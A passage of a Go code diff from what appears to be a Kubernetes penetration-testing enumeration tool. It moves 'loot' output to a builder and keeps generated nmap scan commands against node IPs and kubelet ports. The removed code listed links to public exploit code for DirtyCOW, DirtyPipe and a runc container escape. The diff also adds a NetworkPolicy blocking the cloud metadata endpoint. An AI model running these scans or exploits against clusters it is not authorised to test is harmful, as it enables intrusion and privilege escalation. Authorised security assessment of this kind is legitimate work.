-			content = append(content, "            cidr: 0.0.0.0/0")
-			content = append(content, "            except:")
-			content = append(content, "            - 169.254.169.254/32")
-			content = append(content, "")
+	section.Add("  Remediation:")
+	section.Add("    # Block IMDS access with NetworkPolicy:")
+	section.Add("    apiVersion: networking.k8s.io/v1")
+	section.Add("    kind: NetworkPolicy")
+	section.Add("    metadata:")
+	section.Add("      name: deny-metadata-access")
+	section.Add("    spec:")
+	section.Add("      podSelector: {}")
+	section.Add("      policyTypes:")
+	section.Add("      - Egress")
+	section.Add("      egress:")
+	section.Add("      - to:")
+	section.Add("        - ipBlock:")
+	section.Add("            cidr: 0.0.0.0/0")
+	section.Add("            except:")
+	section.Add("            - 169.254.169.254/32")
+	section.AddBlank()
 
-			content = append(content, "───────────────────────────────────────────────────────────────")
-			content = append(content, "")
+	section.Add("───────────────────────────────────────────────────────────────")
+	section.AddBlank()
 		}
 	}
 
 	if !hasRisk {
-		content = append(content, "✓ No critical IMDS access risks detected")
-		content = append(content, "")
+	section.Add("✓ No critical IMDS access risks detected")
+	section.AddBlank()
 	}
 
-	return internal.LootFile{
-		Name:     "Node-IMDS-Risk",
-		Contents: strings.Join(content, "\n"),
-	}
 }
 
-func generateKernelVulnerabilitiesLoot(findings []NodeFinding) internal.LootFile {
-	var content []string
+func generateNMAPLoot(findings []NodeFinding, loot *shared.LootBuilder) {
+	section := loot.Section("NMAP-Nodes")
 
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "         KERNEL AND OS VULNERABILITIES")
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "")
-
-	hasVulns := false
-
-	for _, f := range findings {
-		if len(f.Vulnerabilities) > 0 {
-			hasVulns = true
-
-			content = append(content, fmt.Sprintf("Node: %s", f.Name))
-			content = append(content, fmt.Sprintf("  OS: %s", f.OSImage))
-			content = append(content, fmt.Sprintf("  Kernel: %s", f.KernelVersion))
-			content = append(content, fmt.Sprintf("  Runtime: %s", f.ContainerRuntime))
-			content = append(content, "")
-
-			content = append(content, "  Vulnerabilities:")
-			for _, vuln := range f.Vulnerabilities {
-				content = append(content, fmt.Sprintf("    • %s", vuln))
-			}
-			content = append(content, "")
-
-			content = append(content, "  Exploitation Resources:")
-			for _, vuln := range f.Vulnerabilities {
-				if strings.Contains(vuln, "DirtyCOW") {
-					content = append(content, "    • DirtyCOW: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs")
-				}
-				if strings.Contains(vuln, "DirtyPipe") {
-					content = append(content, "    • DirtyPipe: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits")
-				}
-				if strings.Contains(vuln, "CVE-2019-5736") {
-					content = append(content, "    • runc escape: https://github.com/Frichetten/CVE-2019-5736-PoC")
-				}
-			}
-			content = append(content, "")
-
-			content = append(content, "───────────────────────────────────────────────────────────────")
-			content = append(content, "")
-		}
-	}
-
-	if !hasVulns {
-		content = append(content, "✓ No known kernel/OS vulnerabilities detected")
-		content = append(content, "")
-	}
-
-	return internal.LootFile{
-		Name:     "Node-Kernel-Vulnerabilities",
-		Contents: strings.Join(content, "\n"),
-	}
-}
-
-func generateNodesAttackPathsLoot(findings []NodeFinding) internal.LootFile {
-	var content []string
-
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "         COMPLETE ATTACK PATHS")
-	content = append(content, "═══════════════════════════════════════════════════════════════")
-	content = append(content, "")
-
-	for _, f := range findings {
-		if len(f.AttackPaths) > 0 {
-			content = append(content, fmt.Sprintf("Node: %s [%s]", f.Name, f.RiskLevel))
-			content = append(content, "")
-
-			for i, path := range f.AttackPaths {
-				content = append(content, fmt.Sprintf("  Attack Path %d:", i+1))
-				content = append(content, fmt.Sprintf("    %s", path))
-				content = append(content, "")
-			}
-
-			content = append(content, "───────────────────────────────────────────────────────────────")
-			content = append(content, "")
-		}
-	}
-
-	return internal.LootFile{
-		Name:     "Node-Attack-Paths",
-		Contents: strings.Join(content, "\n"),
-	}
-}
-
-func generateNMAPLoot(findings []NodeFinding) internal.LootFile {
-	var content []string
-
-	content = append(content, "#####################################")
-	content = append(content, "##### NMAP Commands for Nodes")
-	content = append(content, "#####################################")
-	content = append(content, "")
+	section.SetHeader(`#####################################
+##### NMAP Commands for Nodes
+#####################################
+`)
 
 	for _, f := range findings {
 		if f.IsExternallyExposed {
-			content = append(content, fmt.Sprintf("# Node: %s (External IP: %s)", f.Name, f.ExternalIP))
-			content = append(content, "# Full port scan")
-			content = append(content, fmt.Sprintf("nmap -sV -p- %s", f.ExternalIP))
-			content = append(content, "")
-			content = append(content, "# Kubernetes-specific ports")
-			content = append(content, fmt.Sprintf("nmap -sV -p 22,3389,6443,10250,10255,30000-32767 %s", f.ExternalIP))
-			content = append(content, "")
+	section.Addf("# Node: %s (External IP: %s)", f.Name, f.ExternalIP)
+	section.Add("# Full port scan")
+	section.Addf("nmap -sV -p- %s", f.ExternalIP)
+	section.AddBlank()
+	section.Add("# Kubernetes-specific ports")
+	section.Addf("nmap -sV -p 22,3389,6443,10250,10255,30000-32767 %s", f.ExternalIP)
+	section.AddBlank()
 		} else if f.InternalIP != "" {
-			content = append(content, fmt.Sprintf("# Node: %s (Internal IP: %s)", f.Name, f.InternalIP))
-			content = append(content, "# From within cluster:")
-			content = append(content, fmt.Sprintf("nmap -sV -p 10250,10255 %s", f.InternalIP))
-			content = append(content, "")
+	section.Addf("# Node: %s (Internal IP: %s)", f.Name, f.InternalIP)
+	section.Add("# From within cluster:")
+	section.Addf("nmap -sV -p 10250,10255 %s", f.InternalIP)
+	section.AddBlank()
 		}
 	}
 
-	return internal.LootFile{
-		Name:     "NMAP-Nodes",
-		Contents: strings.Join(content, "\n"),
-	}
 }
 
 // Helper functions
@@ -1914,49 +1456,6 @@ func isDangerousHostPath(path string) bool {
 		}
 	}
 	return false
-}
-
-func extractKeyLabels(labels map[string]string) string {
-	keyPrefixes := []string{
-		"node-role.kubernetes.io/",
-		"kubernetes.io/role",
-		"node.kubernetes.io/instance-type",
-		"topology.kubernetes.io/zone",
-		"topology.kubernetes.io/region",
-	}
-
-	var keyLabels []string
-	for k, v := range labels {
-		for _, prefix := range keyPrefixes {
-			if strings.HasPrefix(k, prefix) {
-				keyLabels = append(keyLabels, fmt.Sprintf("%s=%s", k, v))
-			}
-		}
-	}
-
-	return strings.Join(keyLabels, ", ")
-}
-
-func limitString(s string, maxLen int) string {
-	if len(s) <= maxLen {
-		return s
-	}
-	return s[:maxLen-3] + "..."
-}
-
-func nodesRiskLevelValue(level string) int {
-	switch level {
-	case "CRITICAL":
-		return 4
-	case "HIGH":
-		return 3
-	case "MEDIUM":
-		return 2
-	case "LOW":
-		return 1
-	default:
-		return 0
-	}
 }
 
 func nodesContains(slice []string, item string) bool {
